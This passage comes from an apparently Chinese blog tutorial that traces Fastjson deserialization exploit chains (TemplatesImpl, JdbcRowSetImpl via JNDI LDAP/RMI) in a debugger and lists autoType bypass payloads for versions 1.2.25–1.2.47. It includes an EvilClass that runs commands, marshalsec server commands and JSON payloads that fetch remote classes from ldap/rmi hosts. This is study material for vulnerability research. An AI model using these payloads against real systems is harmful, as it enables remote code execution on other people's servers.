+<p>然后来到了我们的关键函数<code>outputProperties</code>，进入<code>setValue()</code></p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130183410580.png"></p>
+<p>下图可以看到，会通过反射机制调用<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()</code>方法，下划线跑去哪了？在经过<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code>函数时，会把下划线去掉。</p>
+<p><code>getOutputProperties()</code>方法类型是<code>Properties</code>，满足之前我们得到的结论即Fastjson反序列化会调用被反序列化的类的某些满足条件的<code>getter</code>方法，继续跟进，这里需要选择强制进入</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130183521907.png"></p>
+<p>然后调用了<code>MethodAccessor.invoke(obj, args)</code>，继续强制进入</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130183804174.png"></p>
+<p>继续强制进入</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130183833536.png"></p>
+<p>继续强制进入</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130183909869.png"></p>
+<p>在<code>getOutputProperties()</code>方法中调用了<code>newTransformer().getOutputProperties()</code>方法，跟进<code>newTransformer()</code>方法：</p>
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130184004866.png" style="zoom:80%;">
+
+<p>然后跟进<code>getTransletInstance()</code>方法</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130184116972.png"></p>
+<p>在<code>defineTransletClasses()</code>方法中，会根据<code>_bytecodes</code>的值生成<code>EvilClass</code>类</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130184220452.png"></p>
+<p>跟进<code>defineTransletClasses()</code>函数看看，发现会调用<code>_tfactory.getExternalExtensionsMap()</code>函数，因此我们的json数据中有<code>_tfactory</code>这个参数，否则为null会导致报错</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231129115507245.png"></p>
+<p>继续看<code>defineTransletClasses()</code>函数，该函数还会判断恶意类是否继承了<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>，否则会报错。所以<code>EvilClass</code>类的代码中继承了<code>AbstractTranslet</code>。</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231129122117742.png"></p>
+<p>可以看到最终解析到<code>class TemplatesImpl_Exploit.EvilClass</code>类了：</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130184738079.png"></p>
+<p>后面就是EvilClass类的实例化过程，过程中会调用构造函数，并弹出计算器</p>
+<p>最后的调用过滤再具体说下：在<code>getTransletInstance()</code>函数中调用了<code>defineTransletClasses()</code>函数，在<code>defineTransletClasses()</code>函数中会根据<code>_bytecodes</code>来生成一个Java类（这里为恶意类<code>EvilClass</code>），该类构造方法中含有命令执行代码，生成的Java类随后会被<code>newInstance()</code>方法调用生成一个实例对象，从而该类的构造函数被自动调用，进而造成任意代码执行。</p>
+<h3 id="基于JdbcRowSetImpl的利用链"><a href="#基于JdbcRowSetImpl的利用链" class="headerlink" title="基于JdbcRowSetImpl的利用链"></a>基于<code>JdbcRowSetImpl</code>的利用链</h3><p>基于JdbcRowSetImpl的利用链主要有两种利用方式，即<code>JNDI+RMI</code>和<code>JNDI+LDAP</code>，都是属于基于<code>Bean Property</code>类型的JNDI的利用方式。</p>
+<h4 id="限制条件-1"><a href="#限制条件-1" class="headerlink" title="限制条件"></a>限制条件</h4><p>由于是利用JNDI注入漏洞来触发的，因此主要的限制因素是JDK版本。</p>
+<p>基于RMI利用的JDK版本&lt;=6u141、7u131、8u121，基于LDAP利用的JDK版本&lt;=6u211、7u201、8u191</p>
+<p>笔者此处用的是7u76</p>
+<h4 id="JNDI-LDAP复现"><a href="#JNDI-LDAP复现" class="headerlink" title="JNDI+LDAP复现"></a>JNDI+LDAP复现</h4><p>新建一个类<code>JdbcRowSetImpl_EXP.java</code></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">JdbcRowSetImpl_Exploit</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span>JSON<span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcRowSetImpl_EXP</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">"{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/EvilClass\", \"autoCommit\":true}"</span><span class="token punctuation">;</span>
+        JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>另外新建一个 Maven 项目，jdk 选择 7u76，其它什么都不用动，然后新建一个类<code>EvilClass.java</code></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EvilClass</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token class-name">EvilClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cmds <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"os.name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"win"</span><span class="token punctuation">)</span>
+                    <span class="token operator">?</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"cmd.exe"</span><span class="token punctuation">,</span><span class="token string">"/c"</span><span class="token punctuation">,</span> <span class="token string">"calc.exe"</span><span class="token punctuation">}</span>
+                    <span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"touch /tmp/hacked"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
+            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmds<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token class-name">EvilClass</span> e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EvilClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>运行<code>EvilClass.java</code>，会在<code>target\classes\</code>生成<code>EvilClass.class</code>文件，在此目录开启一个http服务</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201084122598.png"></p>
+<p>然后利用反序列化工具<code>marshalsec</code>，开一个LDAP服务</p>
+<pre class="line-numbers language-none"><code class="language-none">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:9898/#EvilClass"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>运行<code>JdbcRowSetImpl_EXP.java</code>，成功弹出计算器，有报错但不影响</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201084522702.png"></p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201084811872.png"></p>
+<h4 id="JNDI-RMI复现"><a href="#JNDI-RMI复现" class="headerlink" title="JNDI+RMI复现"></a>JNDI+RMI复现</h4><p>修改<code>JdbcRowSetImpl_EXP.java</code>的payload中<code>dataSourceName</code>值为<code>rmi://127.0.0.1:1099/EvilClass</code></p>
+<p>用marshalsec开启一个RMI服务</p>
+<pre class="line-numbers language-none"><code class="language-none">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://127.0.0.1:9898/#EvilClass"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201085349761.png"></p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201085726778.png"></p>
+<h4 id="调试分析-1"><a href="#调试分析-1" class="headerlink" title="调试分析"></a>调试分析</h4><p>以RMI为例，断点下在<code>JSON.parse(payload);</code>，前面是类似的，直奔主题</p>
+<p>在<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code>处会对payload的json数据进行循环遍历，可以看到此时已经解析到<code>com.sun.rowset.JdbcRowSetImpl</code>类了，继续运行</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201095253335.png"></p>
+<p>接着对<code>JdbcRowSetImpl</code>进行反序列化</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201095607620.png"></p>
+<p>接下来有些地方通过ASM机制在运行，不太好调试了，我们提前在<code>com.sun.rowset.JdbcRowSetImpl</code>下面两处打好断点等它过来</p>
+<pre class="line-numbers language-none"><code class="language-none">com.sun.rowset.JdbcRowSetImpl#setDataSourceName
+com.sun.rowset.JdbcRowSetImpl#setAutoCommit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>首先来到了<code>setDataSourceName()</code>函数处，将<code>dataSource</code>设置成了<code>rmi://127.0.0.1:1099/EvilClass</code></p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201102613671.png"></p>
+<p>接着再来到<code>setAutoCommit()</code>函数，这里跟进<code>connect()</code>函数</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201103025720.png"></p>
+<p>跟进后发现JNDI的熟悉的注入代码<code>InitialContext.lookup()</code>方法，其参数<code>this.getDataSourceName()</code>会获得RMI链接，从而导致JNDI注入</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201103325953.png"></p>
+<h3 id="补丁与绕过"><a href="#补丁与绕过" class="headerlink" title="补丁与绕过"></a>补丁与绕过</h3><h4 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h4><p>修改一下pom.xml，把fastjson版本修改为<code>1.2.41</code>，然后重新加载</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.2.41<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>运行<code>JdbcRowSetImpl_EXP.java</code>，发现报错，提示autoType禁用了<code>com.sun.rowset.JdbcRowSetImpl</code></p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201104752314.png"></p>
+<p>调试，前面步骤差不多，我们直奔主题<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code>，debug到该函数下，发现多了个函数<code>checkAutoType()</code>，跟进</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201105217776.png"></p>
+<p>可以看出来<code>checkAutoType()</code>函数增加了黑白名单，acceptList为白名单，denyList为黑名单。低版本Fastjson白名单需要自己设置，默认为空；黑名单有如下图的23组，前面分析的两条利用链<code>com.sun.</code>被包含在了第3组。</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201105502189.png"></p>
+<p>该函数还引入了一个参数autoTypeSupport，默认为false：</p>
+<p>当<strong>autoTypeSupport为true</strong>时，先进行白名单过滤，匹配成功即可加载该类并返回；否则进行黑名单过滤，匹配成功直接报错；两者皆未匹配成功，则加载该类。<strong>宏观上相当于黑名单机制。默认放行，黑名单过滤。</strong><br>当<strong>autoTypeSupport为false</strong>时，先进行黑名单过滤，匹配成功直接报错；再匹配白名单，匹配成功即可加载该类并返回；两者皆未匹配成功，则报错。<strong>宏观上相当于白名单机制。默认拒绝，白名单放行。</strong></p>
+<p>将autoTypeSupport设置为True有两种方法：</p>
+<ul>
+<li>JVM启动参数：<code>-Dfastjson.parser.autoTypeSupport=true</code></li>
+<li>代码中设置：<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code>如果有使用非全局ParserConfig则用另外调用<code>setAutoTypeSupport(true);</code></li>
+</ul>
+<p>AutoType白名单设置方法：</p>
+<ul>
+<li>JVM启动参数：<code>-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy.</code></li>
+<li>代码中设置：<code>ParserConfig.getGlobalInstance().addAccept(“com.xx.a”);</code></li>
+<li>通过<code>fastjson.properties</code>文件配置。在1.2.25/1.2.26版本支持通过类路径的<code>fastjson.properties</code>文件来配置，配置方式如下：<code>fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.</code></li>
+</ul>
+<p>继续调试，就会由于在<code>checkAutoType()</code>函数中未开启autoTypeSupport，即默认设置false的场景下被黑名单过滤了，从而导致抛出异常</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201112624676.png"></p>
+<h4 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h4><p>注意：以下payload都是<strong>需要AutoTypeSupport为true</strong>才能成功利用的</p>
+<h5 id="1-2-25-1-2-41"><a href="#1-2-25-1-2-41" class="headerlink" title="1.2.25-1.2.41"></a>1.2.25-1.2.41</h5><p>先上payload，该payload适用于1.2.25-1.2.41</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"Lcom.sun.rowset.JdbcRowSetImpl;"</span><span class="token punctuation">,</span><span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://127.0.0.1:1099/EvilClass"</span><span class="token punctuation">,</span> <span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>通过前面分析我们知道，虽然<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>不在黑名单里面，但是当autoTypeSupport为false时，在黑白名单都无法匹配的情况下也是报错的。</p>
+<p>下面我们用<code>JdbcRowSetImpl</code>利用链的代码调试一下，注意需要开启AutoTypeSupport，添加以下代码即可：</p>
+<pre class="line-numbers language-none"><code class="language-none">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>由于绕过了校验，往下会执行<code>TypeUtils.loadClass(typeName, this.defaultClassLoader, false)</code>，跟进</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201114011112.png"></p>
+<p>然后就真相大白了，第二框会把<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>转换成<code>com.sun.rowset.JdbcRowSetImpl</code>，即成功绕过。</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201114208247.png"></p>
+<p>另外还有两种绕过方式，可以自行调试：</p>
+<h5 id="1-2-25-1-2-42"><a href="#1-2-25-1-2-42" class="headerlink" title="1.2.25-1.2.42"></a>1.2.25-1.2.42</h5><p>适用于1.2.25-1.2.42</p>
+<pre class="line-numbers language-none"><code class="language-none">{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"rmi://127.0.0.1:1099/EvilClass", "autoCommit":true}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h5 id="1-2-25-1-2-43"><a href="#1-2-25-1-2-43" class="headerlink" title="1.2.25-1.2.43"></a>1.2.25-1.2.43</h5><p>笔者此处还圈出了第一个框，它是另一种绕过方式，payload如下，适用于1.2.25-1.2.43版本。第一个逗号之前之所以多了两个符号<code>[{</code>，是因为该利用链在反序列化过程中涉及到一些其他判断需要绕过。具体调试可以尝试去掉这两个符号<code>[{</code>，执行代码观察报错</p>
+<pre class="line-numbers language-none"><code class="language-none">{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"rmi://127.0.0.1:1099/EvilClass", "autoCommit":true}
+
+{"@type":"[com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://localhost:1389/Exploit", "autoCommit":true}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h5 id="1-2-25-1-2-45"><a href="#1-2-25-1-2-45" class="headerlink" title="1.2.25-1.2.45"></a>1.2.25-1.2.45</h5><p>适用于1.2.25-1.2.45，需要存在mybatis的jar包，且其版本需为3.x.x系列&lt;3.5.0的版本</p>
+<pre class="line-numbers language-none"><code class="language-none">{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://127.0.0.1:1099/EvilClass"}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h5 id="hash黑名单"><a href="#hash黑名单" class="headerlink" title="hash黑名单"></a>hash黑名单</h5><p>从1.2.42版本开始，Fastjson把原本明文形式的黑名单改成了哈希过的黑名单，目的就是为了防止安全研究者对其进行研究，提高漏洞利用门槛，但是有人已在Github上跑出了大部分黑名单包类：<a href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></p>
+<p>通过对黑名单的研究，我们可以找到具体版本有哪些利用链可以利用。例如<code>Fastjson &lt; 1.2.66</code>：</p>
+<p>基于黑名单绕过，autoTypeSupport属性true才能使用，在1.2.25版本之后，autoTypeSupport默认为false。</p>
+<pre class="line-numbers language-none"><code class="language-none">{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://ip:1389/Calc"}{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://ip:1389/Calc"}{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://ip:1389/Calc"}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="反序列化漏洞（二）——1-2-25-1-2-47"><a href="#反序列化漏洞（二）——1-2-25-1-2-47" class="headerlink" title="反序列化漏洞（二）——1.2.25-1.2.47"></a>反序列化漏洞（二）——1.2.25-1.2.47</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Fastjson 1.2.25-1.2.47版本</p>
+<p>利用链基于RMI利用的JDK版本&lt;=6u141、7u131、8u121，基于LDAP利用的JDK版本&lt;=6u211、7u201、8u191</p>
+<p>此漏洞也可以理解为是一种绕过思路，绕过的大体思路是通过<code>java.lang.Class</code>，将<code>com.sun.rowset.JdbcRowSetImpl</code>类加载到Map缓存中，从而绕过AutoType的检测。然后再通过<code>com.sun.rowset.JdbcRowSetImpl</code>执行恶意RMI链接。payload如下：</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
+    <span class="token property">"a"</span><span class="token operator">:</span><span class="token punctuation">{</span>
+        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span>
+        <span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span>
+    <span class="token punctuation">}</span><span class="token punctuation">,</span>
+    <span class="token property">"b"</span><span class="token operator">:</span><span class="token punctuation">{</span>
+        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span>
+        <span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://127.0.0.1:1099/EvilClass"</span><span class="token punctuation">,</span>
+        <span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看到实际上还是利用了<code>com.sun.rowset.JdbcRowSetImpl</code>这条利用链来攻击利用的，因此除了JDK版本外几乎没有其它限制。</p>
+<p>注意，这个payload根据AutoTypeSupport模式的不同，能影响的版本也不同：</p>
+<p>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；</p>
+<p>1.2.33-1.2.47版本：无论是否开启AutoTypeSuppt，都能成功利用；</p>
+<p><strong>注意，下面都是在1.2.41版本做的调试</strong></p>
+<h3 id="不开启AutoTypeSupport"><a href="#不开启AutoTypeSupport" class="headerlink" title="不开启AutoTypeSupport"></a>不开启AutoTypeSupport</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">JdbcRowSetImpl_Exploit</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span>JSON<span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcRowSetImpl_EXP</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>
+<span class="token comment">//        String payload = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilClass\", \"autoCommit\":true}";</span>
+        <span class="token class-name">String</span> payload  <span class="token operator">=</span> <span class="token string">"{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},"</span>
+                <span class="token operator">+</span> <span class="token string">"\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","</span>
+                <span class="token operator">+</span> <span class="token string">"\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilClass\",\"autoCommit\":true}}"</span><span class="token punctuation">;</span>
+        JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>调试一下，我们直接进入<code>checkAutoType()</code>函数，由于autoTypeSupport为false，所以不会进入第一个白名单，继续往下调试</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201140116727.png"></p>
+<p>由于此时typeName为<code>java.lang.Class</code>，会在<code>this.deserializers.findClass(typeName)</code>函数中直接被找到，之后<code>clazz</code>不为空，所以不会经过第二个黑名单就会被返回。</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201140830984.png"></p>
+<p>返回到<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code>函数，跟进<code>deserialze()</code>函数</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201140958963.png"></p>
+<p>进去后会对val进行判空，然后继续执行解析出<code>com.sun.rowset.JdbcRowSetImpl</code>并赋值给<code>objVal</code>，往下执行</p>
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201141219432.png" style="zoom:80%;">
+
+<p>然后赋值给<code>strVal</code>变量，往下执行</p>
+<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201141511436.png" style="zoom:80%;">
+
+<p>接着判断clazz是否为class类，是的话调用<code>TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader())</code>加载strVal指定的类，跟进<code>loadClass()</code></p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201141810948.png"></p>
+<p>在<code>loadClass()</code>里面，成功加载<code>com.sun.rowset.JdbcRowSetImpl</code>后，会放进map中作为缓存</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201141939523.png"></p>
+<p>在遍历第二部分json数据时，依然会进入<code>checkAutoType()</code>函数，此时可以通过<code>TypeUtils.getClassFromMapping(typeName)</code>函数获取到刚才在map中缓存的<code>com.sun.rowset.JdbcRowSetImpl</code>，于是clazz就有了值，可以直接绕过第二次黑白名单判断，直接返回，从而成功绕过<code>checkAutoType()</code>的检测造成JNDI注入。</p>
+<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201142313798.png"></p>
+<h3 id="开启AutoTypeSupport"><a href="#开启AutoTypeSupport" class="headerlink" title="开启AutoTypeSupport"></a>开启AutoTypeSupport</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">JdbcRowSetImpl_Exploit</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span>JSON<span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcRowSetImpl_EXP</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">//        String payload = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilClass\", \"autoCommit\":true}";</span>
+        <span class="token class-name">String</span> payload  <span class="token operator">=</span> <span class="token string">"{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},"</span>
+                <span class="token operator">+</span> <span class="token string">"\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","</span>
